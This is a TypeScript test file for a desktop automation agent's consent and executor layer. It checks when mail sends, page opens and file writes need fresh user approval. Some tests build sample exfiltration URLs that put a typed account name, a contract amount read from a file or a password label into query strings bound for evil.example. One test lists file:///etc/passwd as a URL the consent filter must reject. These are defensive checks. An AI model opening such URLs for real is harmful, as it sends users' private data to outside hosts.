/**
 * Two rc.10 real-machine findings: an anonymous container vanishing re-asked a mail send (run_52d8ea2a); nine pages
 * opened with open_window in the user's Chrome window asked nine cards (run_93d40dbe).
 */
import { describe, expect, it } from "vitest";
import { Gateway } from "../src/gateway/index.js";
import type { Answer, Card } from "../src/orchestrator/index.js";
import { ConsentSigner } from "../src/executor/consent.js";
import { Executor, anonymous } from "../src/executor/executor.js";
import { OUTGOING_QUESTION, Judge } from "../src/executor/judge.js";
import { SimComputer } from "../src/executor/sim.js";
import { FrontierRuntime } from "../src/runtime/loop.js";
import { scriptedStream, type Step } from "../src/runtime/scripted.js";
import type { Action, Driver, Element, WindowInfo } from "../src/executor/types.js";

const table = Object.fromEntries(["goal", "plan", "bind", "intent", "choice", "skill", "verify", "transform"].map((r) => [r, { backend: "scripted", model: "scripted" }])) as any;
const model = { model: { id: "scripted", name: "scripted", api: "openai-completions", provider: "test", baseUrl: "", input: ["text"], cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, reasoning: false, contextWindow: 1e6, maxTokens: 1e5 } as any };

class Desk implements Driver {
  epoch = 1; log: Action[] = [];
  constructor(public w: { info: WindowInfo; elements: Element[] }) {}
  snapshot() { return { epoch: this.epoch, locked: false, front_app: "Safari", windows: [this.w.info] }; }
  observe() { return { epoch: this.epoch, window: this.w.info, modal: null, elements: this.w.elements.map((e) => ({ ...e })), text: "" }; }
  perform(a: Action) { this.log.push(a); this.epoch += 1; return { status: "ok" as const, window: this.w.info.id }; }
}

describe("anonymous containers are not bound to a send", () => {
  const compose = (extra: Element[] = [], pixels = false): Element[] => [
    { id: pixels ? "ocr:0" : "elem_1", role: pixels ? "listitem" : "statictext", label: "许诺 <xu@example.com>", actions: pixels ? ["click"] : [], rect: [10, 10, 200, 20] },
    { id: pixels ? "ocr:1" : "elem_2", role: pixels ? "listitem" : "textarea", label: "回复内容", value: pixels ? undefined : "我看一下再说", actions: pixels ? ["click"] : ["set_value", "type"], rect: [10, 100, 400, 80] },
    { id: pixels ? "ocr:2" : "elem_3", role: pixels ? "listitem" : "button", label: "发送", actions: ["click"], rect: [420, 100, 60, 30] },
    ...extra,
  ];
  const run = async (before: Element[], after: Element[], pixelSendBinding: "strict" | "match" = "strict") => {
    const gw = new Gateway(table);
    gw.script = Array(20).fill((_r: string, _s: string, u: string) => (u.includes(OUTGOING_QUESTION.slice(0, 12)) ? { choice: "sends" } : { choice: "matches" }));
    const desk = new Desk({ info: { id: "com.apple.Safari#30514", app: "com.apple.Safari", title: "Mailora" }, elements: before });
    const app = ConsentSigner.fresh();
    const ex = new Executor(desk, { task: "t1", publicKey: app.publicKey, judge: new Judge([{ name: "frontier", gateway: gw }]), raw: "回复许诺并发送", pixelSendBinding });
    await ex.begin(); await ex.plan({ steps: [] });
    const o = await ex.observe("com.apple.Safari#30514");
    const send: Action = { kind: "click", window: "com.apple.Safari#30514", target: before.find((e) => e.label === "发送")!.id };
    const r1 = await ex.act({ action: send, epoch: o.epoch, consent: app.forObject("window:com.apple.Safari#30514", "modify_user", "t1") });
    desk.w.elements = after;
    const r2 = await ex.act({ action: send, epoch: o.epoch, consent: app.forAction(r1.challenge!) });
    return { r2, sent: desk.log.length };
  };
  // hands reports the role description beside the label (AXRoleDescription): a label equal to it names nothing
  const group: Element = { id: "elem_9", role: "group", label: "组", role_description: "组", actions: ["click"], rect: [62, 16, 20, 20] };

  it("an anonymous 「组」 vanishing (rc.10's trace) no longer asks again; the send goes out", async () => {
    const { r2, sent } = await run(compose([group]), compose());
    expect([r2.status, sent]).toEqual(["ok", 1]);
  });

  it("a new recipient chip — an anonymous group with the address beside it — appearing asks again", async () => {
    const chip: Element[] = [{ id: "elem_20", role: "group", label: "", actions: ["click"], rect: [220, 10, 120, 20] }, { id: "elem_21", role: "statictext", label: "b@evil.com", actions: [], rect: [280, 10, 80, 20] }];
    const { r2, sent } = await run(compose([group]), compose([group, ...chip]));
    expect([r2.status, sent]).toEqual(["needs_consent", 0]);
  });

  it("without hands' role_description a 「组」 label is a name: it vanishing still asks (until hands sends it)", async () => {
    const { role_description: _r, ...bare } = group;
    const { r2 } = await run(compose([bare as Element]), compose());
    expect(r2.status).toBe("needs_consent");
  });

  it("a labelled recipient vanishing still asks again", async () => {
    const { r2, sent } = await run(compose([group]), compose([group]).slice(1));
    expect([r2.status, sent]).toEqual(["needs_consent", 0]);
  });

  it("strict, a screen-read window: an unlabelled container vanishing does not ask; a text row vanishing does", async () => {
    const blank: Element = { id: "gen:1", role: "group", label: "", actions: ["click"], rect: [0, 0, 500, 300] };
    expect((await run(compose([blank], true), compose([], true))).r2.status).toBe("ok");
    expect((await run(compose([blank], true), compose([blank], true).slice(1))).r2.status).toBe("needs_consent");
  });

  it("what counts as anonymous: a container, no value, a label that is empty or only its role's description, no selection, not a sender, nothing beyond a click", () => {
    expect(anonymous(group)).toBe(true);
    expect(anonymous({ ...group, label: "", role_description: undefined })).toBe(true);
    expect(anonymous({ ...group, role: "AXGroup", label: "group", role_description: undefined, label_from_role: true })).toBe(true);
    expect(anonymous({ ...group, role_description: undefined })).toBe(false);          // no word table: 「组」 alone is a name
    expect(anonymous({ ...group, role: "button", label: "" })).toBe(false);            // an unnamed button is not a container
    expect(anonymous({ ...group, role: "row", label: "" })).toBe(false);
    expect(anonymous({ ...group, label: "收件人" })).toBe(false);
    expect(anonymous({ ...group, value: "x" })).toBe(false);
    expect(anonymous({ ...group, focused: true })).toBe(false);
    expect(anonymous({ ...group, sends: true })).toBe(false);
    expect(anonymous({ ...group, actions: ["click", "set_value"] })).toBe(false);
  });
});

describe("pages opened in the user's browser window are planned once", () => {
  const run = (steps: Step[]) => {
    const sim = new SimComputer();
    const chrome = sim.addBrowser("Google Chrome", [{ title: "收件箱 - Gmail", url: "https://mail.google.com" }]).id;
    const app = ConsentSigner.fresh();
    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey });
    const gw = new Gateway(table);
    gw.script = Array(40).fill((role: string) => (role === "verify" ? { choice: "pass", reason: "ok" } : { choice: "matches" }));
    const cards: Card[] = [], events: { k: string; b: Record<string, unknown> }[] = [];
    const rt = new FrontierRuntime({ task: "t1", raw: "搜索今天北京天气", executor: ex, signer: app, user: { ask: (c: Card): Answer => { cards.push(c); return { option: c.options.findIndex((o) => o.kind === "approve") }; } }, gateway: gw, model: { ...model, streamFn: scriptedStream(steps) }, onEvent: (k, b) => events.push({ k, b }) });
    return { rt, cards, events, chrome };
  };
  const open = (url: string) => (ms: any[]): Step => {
    const m = [...ms].reverse().find((x) => x.role === "toolResult"); let epoch = 1;
    try { const j = JSON.parse(m.content[0].text.split("\n")[0]); epoch = j.after?.epoch ?? j.epoch ?? 1; } catch { /* plan result */ }
    return { calls: [{ name: "computer_act", args: { action: { kind: "open_window", app: "Google Chrome", url }, epoch, consequence: "create", purpose: "打开网页" } }] };
  };
  const snap: Step = { calls: [{ name: "computer_snapshot", args: {} }] };
  const finish: Step = { calls: [{ name: "finish", args: { outcome: "done", summary: "查到了" } }] };

  const opens = [{ app: "Google Chrome", url: "https://www.google.com/search?q=今天北京天气" }, { app: "Google Chrome", url: "https://wttr.in/Beijing?lang=zh" }];

  it("a step with opens into the user's Chrome: the card lists the sites as 改你的东西, and pages of those sites open without cards", async () => {
    const { rt, cards, events, chrome } = run([
      { calls: [{ name: "plan", args: { steps: [{ purpose: "打开天气搜索结果", objects: [], consequence: "create", opens }, { purpose: "读天气", objects: [], consequence: "read" }] } }] },
      snap, open("https://www.google.com/search?q=今天北京天气"), snap, open("https://wttr.in/Beijing?lang=zh"), finish,
    ]);
    await rt.run();
    expect(cards.map((c) => c.kind)).toEqual(["plan"]);
    expect(cards[0]!.text).toContain("1. 打开天气搜索结果（在你的 Google Chrome 窗口里打开这些网页：www.google.com/search?q=今天北京天气、wttr.in/Beijing?lang=zh）——改你的东西");
    // the consent is to open exactly those pages there, not the whole window, not the whole site
    expect(events.find((e) => e.k === "plan.classes")!.b).toMatchObject({ settled: ["modify_user", "read"], objects: [], opens: { [`window:${chrome}`]: ["https://www.google.com/search?q=%E4%BB%8A%E5%A4%A9%E5%8C%97%E4%BA%AC%E5%A4%A9%E6%B0%94", "https://wttr.in/Beijing?lang=zh"] } });
    const acts = events.filter((e) => e.k === "tool.result" && e.b.name === "computer_act").map((e) => JSON.parse((e.b.text as string).split("\n")[0]!).status);
    expect(acts).toEqual(["ok", "ok"]);
  });

  it("a page the plan did not list — the same site with another query — and anything else in that window still ask on their own cards, the card showing the full URL", async () => {
    const { rt, cards, chrome } = run([
      { calls: [{ name: "plan", args: { steps: [{ purpose: "打开天气搜索结果", objects: [], consequence: "create", opens }] } }] },
      snap, open("https://www.google.com/search?q=我的身份证号"),
      (ms: any[]) => ({ calls: [{ name: "computer_observe", args: { window: chrome } }] }),
      (ms: any[]) => { const m = [...ms].reverse().find((x) => x.role === "toolResult"); const j = JSON.parse(m.content[0].text.split("\n")[0]); return { calls: [{ name: "computer_act", args: { action: { kind: "click", window: chrome, target: `${chrome}:0:newtab` }, epoch: j.epoch, consequence: "create", purpose: "新标签页" } }] }; },
      finish,
    ]);
    await rt.run();
    expect(cards.map((c) => c.kind)).toEqual(["plan", "action", "action"]);
    expect(cards[1]!.text).toContain("https://www.google.com/search?q=我的身份证号");
  });

  it("without opens (as the run's plan was written), each page asks on its own card — the behaviour opens replaces", async () => {
    const { rt, cards } = run([
      { calls: [{ name: "plan", args: { steps: [{ purpose: "打开天气搜索结果", objects: [], consequence: "create" }] } }] },
      snap, open("https://www.google.com/search?q=今天北京天气"), snap, open("https://wttr.in/Beijing?lang=zh"), finish,
    ]);
    await rt.run();
    expect(cards.map((c) => c.kind)).toEqual(["action", "action"]);
  });

  it("before any plan, the refusal tells the model how to plan it: opens with the app", async () => {
    const { rt, events } = run([snap, open("https://www.google.com/search?q=今天北京天气"), finish]);
    await rt.run();
    const res = events.find((e) => e.k === "tool.result" && e.b.name === "computer_act")!.b.text as string;
    expect(res).toContain("先交计划");
    expect(res).toContain('opens: [{ app: "Google Chrome"');
  });
});

describe("run_ac5345ce: evidence missing after the work is done; element ids on the plan card", () => {
  const mailRun = (verdicts: Record<string, unknown>[], steps: (w: string) => Step[]) => {
    const sim = new SimComputer();
    const w = sim.addMail({ app: "信鸽", texts: { replied: "已回复", inbox: "收件箱", reply: "回复", delete: "删除", flag: "加旗标", unflag: "取消旗标", send: "发送", cancel: "取消", confirm: "确认删除", confirmText: "确定删除这封邮件吗？", body: "回复内容", meeting: "会议时间：%s", empty: "选择一封邮件" }, flagged: [], inbox: [{ id: "m1", from: "林晓", subject: "Q3 预算", body: ["x"], time: "14:00" }] }).id;
    const app = ConsentSigner.fresh();
    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey });
    const gw = new Gateway(table);
    const vs = [...verdicts];
    gw.script = Array(40).fill((role: string) => (role === "verify" ? vs.shift() ?? { choice: "pass", reason: "ok" } : { choice: "matches" }));
    const cards: Card[] = [], events: { k: string; b: Record<string, unknown> }[] = [];
    const rt = new FrontierRuntime({ task: "t1", raw: "给林晓那封邮件加旗标", executor: ex, signer: app, user: { ask: (c: Card): Answer => { cards.push(c); return { option: c.options.findIndex((o) => o.kind === "approve") }; } }, gateway: gw, model: { ...model, streamFn: scriptedStream(steps(w)) }, onEvent: (k, b) => events.push({ k, b }) });
    return { rt, sim, w, cards, events };
  };
  const done: Step = { calls: [{ name: "finish", args: { outcome: "done", summary: "加好了" } }] };
  const look = (w: string): Step => ({ calls: [{ name: "computer_observe", args: { window: w } }] });
  const click = (w: string, target: string) => (ms: any[]): Step => { const m = [...ms].reverse().find((x) => x.role === "toolResult"); const j = JSON.parse(m.content[0].text.split("\n")[0]); return { calls: [{ name: "computer_act", args: { action: { kind: "click", window: w, target }, epoch: j.after?.epoch ?? j.epoch, consequence: "create", purpose: "再点一下找证据" } }] }; };
  const evidence = { choice: "unknown", reason: "从画面读的应用里看不出是否在播放", missing_kind: "evidence" };

  it("an unknown for missing evidence: the model may only look; another click is refused; still unknown → unconfirmed, telling the user what to check", async () => {
    const { rt, sim, w, events } = mailRun([evidence, evidence, evidence], (w) => [done, look(w), click(w, `${w}:0:row:m1`), done, done]);
    const r = await rt.run();
    expect(r.status).toBe("unconfirmed");
    expect(r.reason).toContain("请你看一下：从画面读的应用里看不出是否在播放");
    const results = events.filter((e) => e.k === "tool.result").map((e) => e.b.text as string);
    expect(results.some((t) => t.includes("only look for evidence"))).toBe(true);
    expect(sim.mailState(w).selected).toBeNull();                       // the click never happened
  });

  it("an unknown for an unfinished action: acting goes on as before", async () => {
    const { rt, events } = mailRun([{ choice: "unknown", reason: "还没加旗标", missing_kind: "action" }], (w) => [done, look(w), click(w, `${w}:0:row:m1`), done]);
    await rt.run();
    const results = events.filter((e) => e.k === "tool.result").map((e) => e.b.text as string);
    expect(results.some((t) => t.includes("only look for evidence"))).toBe(false);
  });

  it("the judge's missing_kind reaches the verdict; an answer without it is treated as before (acting allowed)", async () => {
    const { rt, events } = mailRun([{ choice: "unknown", reason: "不知道" }], (w) => [done, look(w), click(w, `${w}:0:row:m1`), done]);
    await rt.run();
    expect(events.filter((e) => e.k === "tool.result").some((e) => (e.b.text as string).includes("only look for evidence"))).toBe(false);
  });

  it("element ids and words that name nothing are not on the plan card", async () => {
    const { rt, cards } = mailRun([], (w) => [{ calls: [{ name: "plan", args: { steps: [{ purpose: "加旗标", objects: [`窗口 ${w}`, "ocr:26", "elem_12", "gen:搜索框"], consequence: "create" }] } }] }, done]);
    await rt.run();
    expect(cards[0]!.text).toContain("1. 加旗标（信鸽「收件箱」）——改你的东西");
    for (const id of ["ocr:26", "elem_12", "gen:搜索框"]) expect(cards[0]!.text).not.toContain(id);
  });
});

describe("the open consent itself", () => {
  it("covers open_window with exactly a listed URL in that window, in that task — not a click, not another page of the site, not another scheme or window", async () => {
    const { ConsentSigner: S, ConsentVerifier } = await import("../src/executor/consent.js");
    const app = S.fresh(), v = new ConsentVerifier(app.publicKey);
    const t = app.forOpen("window:chrome-1", ["https://wttr.in/Beijing", "https://www.bing.com/search?q=weather", "file:///etc/passwd", "view-source:https://wttr.in/Beijing"], "t1");
    expect(t.urls).toEqual(["https://wttr.in/Beijing", "https://www.bing.com/search?q=weather"]);      // http(s) only
    const open = (url: string): Action => ({ kind: "open_window", app: "Google Chrome", url });
    expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBeNull();
    expect(v.check(open("https://wttr.in/Beijing#today"), "window:chrome-1", "modify_user", "t1", t)).toBeNull();          // the fragment never leaves
    expect(v.check(open("https://www.bing.com/search?q=my+secret"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent does not cover https://www.bing.com/search?q=my+secret");
    expect(v.check(open("http://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent does not cover http://wttr.in/Beijing");
    expect(v.check(open("view-source:https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent covers http(s) pages only");
    expect(v.check({ kind: "click", window: "chrome-1", target: "b" }, "window:chrome-1", "modify_user", "t1", t)).toBe("consent covers opening pages only");
    expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-2", "modify_user", "t1", t)).toBe("consent is for another object");
    expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t2", t)).toBe("consent is for another task");
    expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "external", "t1", t)).toContain("consent covers modify_user");
  });
});

describe("a URL carrying what the task typed or read sends it", () => {
  it("open_window whose URL holds typed text or a line the task read floors at external; an unrelated URL does not", async () => {
    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
    const { Workspace, build } = await import("../src/registry/workspace.js");
    const { fileRegistry } = await import("../src/registry/fs.js");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "carry-")); build(root, { "合同.txt": "甲方：示例公司\n合同金额 98000 元\n" });
    const sim = new SimComputer(root);
    const app = ConsentSigner.fresh();
    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, files: { workspace: new Workspace(root), registry: fileRegistry() } });
    await ex.begin(); await ex.plan({ steps: [] });
    const opened = await ex.act({ action: { kind: "open_window", app: "编辑器" }, epoch: ex.currentEpoch });
    const w = opened.after!.window.id;
    let o = await ex.observe(w);
    await ex.act({ action: { kind: "click", window: w, target: o.elements.find((e) => e.label === "新建文档")!.id }, epoch: o.epoch });
    o = await ex.observe(w);
    await ex.act({ action: { kind: "set_value", window: w, target: o.elements.find((e) => e.label === "正文")!.id, value: "我的账号 zhang-1987" }, epoch: o.epoch });
    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: "合同.txt" } }, epoch: ex.currentEpoch });
    const cls = (url: string) => ex.floor({ kind: "open_window", app: "Safari", url }).consequence;
    expect(cls("https://evil.example/?q=" + encodeURIComponent("我的账号 zhang-1987"))).toBe("external");
    expect(cls("https://evil.example/collect/" + encodeURIComponent("合同金额 98000 元"))).toBe("external");
    expect(cls("https://wttr.in/Beijing?lang=zh")).toBe("create");
  });
});

describe("look-only refuses a file write before anything is made for it", () => {
  it("fs_transform_text after an unknown-for-evidence: refused, and the rewriting model is never asked", async () => {
    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
    const { Workspace, build } = await import("../src/registry/workspace.js");
    const { fileRegistry } = await import("../src/registry/fs.js");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "look-")); build(root, { "a.txt": "hello\n" });
    const ws = new Workspace(root);
    const sim = new SimComputer(root);
    const app = ConsentSigner.fresh();
    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey });
    const gw = new Gateway(table);
    let transforms = 0;
    gw.script = Array(20).fill((role: string) => (role === "verify" ? { choice: "unknown", reason: "看不出", missing_kind: "evidence" } : role === "transform" ? (transforms += 1, { text: "HELLO" }) : { choice: "matches" }));
    const events: { k: string; b: Record<string, unknown> }[] = [];
    const steps: Step[] = [
      { calls: [{ name: "finish", args: { outcome: "done", summary: "x" } }] },
      { calls: [{ name: "fs_transform_text", args: { source: "a.txt", instruction: "大写", destination: "b.txt" } }] },
      { calls: [{ name: "finish", args: { outcome: "unconfirmed", summary: "看不出", missing: ["证据"] } }] },
    ];
    const rt = new FrontierRuntime({ task: "t1", raw: "x", executor: ex, signer: app, user: { ask: () => null }, gateway: gw, model: { ...model, streamFn: scriptedStream(steps) }, workspace: ws, registry: fileRegistry(), onEvent: (k, b) => events.push({ k, b }) });
    await rt.run();
    expect(transforms).toBe(0);
    expect(events.some((e) => e.k === "tool.result" && e.b.name === "fs_transform_text" && (e.b.text as string).includes("only look for evidence"))).toBe(true);
    expect(fs.existsSync(path.join(root, "b.txt"))).toBe(false);
  });
});

describe("audio_playing in the completion evidence (hands#55)", () => {
  const verdictPrompt = async (atBegin: { bundle: string; app_name?: string }[] | undefined, atEnd: { bundle: string; app_name?: string }[] | undefined) => {
    const info: WindowInfo = { id: "com.netease.163music#1", app: "com.netease.163music", app_name: "网易云音乐", title: "宝贝 - 张悬" };
    let begun = false;
    const desk: Driver = {
      snapshot: () => { const s = { epoch: 1, locked: false, front_app: "DeskMind", windows: [info], ...(begun ? (atEnd ? { audio_playing: atEnd } : {}) : (atBegin ? { audio_playing: atBegin } : {})) }; begun = true; return s; },
      observe: () => ({ epoch: 1, window: info, modal: null, elements: [{ id: "ocr:1", role: "listitem", label: "宝贝 - 张悬", actions: ["click"] }], text: "宝贝 - 张悬 03:12" }),
      perform: () => ({ status: "ok" as const }),
    };
    const gw = new Gateway(table);
    const prompts: string[] = [];
    gw.script = [(_r: string, _s: string, u: string) => { prompts.push(u); return { choice: "pass", reason: "ok" }; }];
    const app = ConsentSigner.fresh();
    const ex = new Executor(desk, { task: "t1", publicKey: app.publicKey, judge: new Judge([{ name: "frontier", gateway: gw }]), raw: "播放张悬的宝贝" });
    await ex.begin();
    await ex.observe("com.netease.163music#1");
    await ex.verdict("在播了");
    return prompts[0]!;
  };
  const netease = { bundle: "com.netease.163music", app_name: "网易云音乐" };

  it("silent at begin, NetEase playing at the end: evidence says it started during the task, beside the window's title", async () => {
    const p = await verdictPrompt(undefined, [netease]);
    expect(p).toContain("正在发声的应用");
    expect(p).toMatch(/"应用": "网易云音乐"[\s\S]*"何时开始": "任务期间开始发声"/);
    expect(p).toContain("宝贝 - 张悬");
    expect(p).toContain("任务期间开始发声」的可以作为在播放的证据");
  });

  it("already playing at begin: marked as pre-existing, not the task's doing", async () => {
    const p = await verdictPrompt([netease], [netease]);
    expect(p).toMatch(/"何时开始": "任务开始时就在发声（不是本任务做的）"/);
  });

  it("an older hands without audio_playing: nothing added", async () => {
    expect(await verdictPrompt(undefined, undefined)).not.toContain("正在发声的应用（");
  });
});

describe("the user's own words are theirs to send (review of #33)", () => {
  const setup = async (raw: string) => {
    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
    const { Workspace, build } = await import("../src/registry/workspace.js");
    const { fileRegistry } = await import("../src/registry/fs.js");
    const root = fs.mkdtempSync(path.join(os.tmpdir(), "own-")); build(root, { "合同.txt": "合同金额 98000 元\n" });
    const sim = new SimComputer(root);
    const app = ConsentSigner.fresh(), events: { k: string; b: Record<string, unknown> }[] = [];
    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, raw, files: { workspace: new Workspace(root), registry: fileRegistry() }, onEvent: (k, b) => events.push({ k, b }) });
    await ex.begin(); await ex.plan({ steps: [] });
    return { ex, sim, events };
  };
  const typeInto = async (ex: Executor, text: string) => {
    const opened = await ex.act({ action: { kind: "open_window", app: "编辑器" }, epoch: ex.currentEpoch });
    const w = opened.after!.window.id;
    let o = await ex.observe(w);
    await ex.act({ action: { kind: "click", window: w, target: o.elements.find((e) => e.label === "新建文档")!.id }, epoch: o.epoch });
    o = await ex.observe(w);
    await ex.act({ action: { kind: "set_value", window: w, target: o.elements.find((e) => e.label === "正文")!.id, value: text }, epoch: o.epoch });
  };
  const search = "https://www.google.com/search?q=" + encodeURIComponent("今天北京天气");

  it("a search for the request's own words, typed by the task first, opens in the task's own browser window with no card", async () => {
    const { ex, events } = await setup("搜索今天北京天气");
    await typeInto(ex, "今天北京天气");
    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: search }).consequence).toBe("create");
    const r = await ex.act({ action: { kind: "open_window", app: "Google Chrome", url: search }, epoch: ex.currentEpoch });
    expect([r.status, r.consequence]).toEqual(["ok", "create"]);
    expect(events.some((e) => e.k === "executor.consent_needed")).toBe(false);
  });

  it("the words of an answer on a card, and the request before a steer, count as the user's too", async () => {
    const { ex } = await setup("查一下天气");
    ex.addAnswer("哪个城市？", "北京海淀");
    ex.setRequest("改成查明天的");
    await typeInto(ex, "北京海淀 查一下天气");
    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.bing.com/search?q=" + encodeURIComponent("北京海淀 查一下天气") }).consequence).toBe("create");
  });

  it("a line the task read from the user's file is still a send, and so is typed text the user never wrote", async () => {
    const { ex } = await setup("搜索今天北京天气");
    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: "合同.txt" } }, epoch: ex.currentEpoch });
    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://www.google.com/search?q=" + encodeURIComponent("合同金额 98000 元") }).consequence).toBe("external");
    await typeInto(ex, "zhang-1987 的密码");
    expect(ex.floor({ kind: "open_window", app: "Google Chrome", url: "https://evil.example/?q=" + encodeURIComponent("zhang-1987 的密码") }).consequence).toBe("external");
  });
});
